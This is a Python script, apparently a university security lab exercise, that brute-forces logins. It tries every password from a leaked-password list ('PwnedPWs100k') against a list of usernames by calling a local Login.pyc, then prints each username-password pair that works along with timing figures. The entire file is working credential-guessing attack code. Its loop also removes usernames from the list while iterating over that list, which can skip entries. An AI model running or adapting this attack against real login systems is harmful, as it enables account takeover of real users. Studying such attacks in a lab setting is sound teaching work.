import time
import subprocess

# directory: /home/cse/Lab1/Q3/

# Open the file containing passwords
with open("/home/cse/Lab1/Q3/PwnedPWs100k") as pw_file:
    passwords = [line.rstrip('\n') for line in pw_file]

# Open the file containing usernames
with open("/home/cse/Lab1/Q3/gang") as user_file:
    usernames = [line.rstrip('\n') for line in user_file]

# Record the start time
start_time = time.time()
print(f'Start time: {start_time - start_time}')

attempt_count = 0
successful_logins = []
interval = 300  # 5 minutes

# Loop through each password and username combination
for password in passwords:
    for username in usernames:
        # Attempt to log in
        result = subprocess.run(
            ["python3", "Login.pyc", username, password],
            capture_output=True,
            text=True,
            cwd="/home/cse/Lab1/Q3/"
        )

        if result.stdout == "Login successful.\n":
            print(f"\nUsername: {username}\nPassword: {password}")
            print(f'Time taken: {time.time() - start_time:.2f}s')
            successful_logins.append(f'{username} - {password} : time taken = {time.time() - start_time}')
            usernames.remove(username)  # Remove found username

        attempt_count += 1
        if time.time() - start_time > interval:
            print(f'\n{interval / 60} minutes have elapsed, on attempt {attempt_count}')
            interval += 300

print('\nEnd')
for login in successful_logins:
    print(login)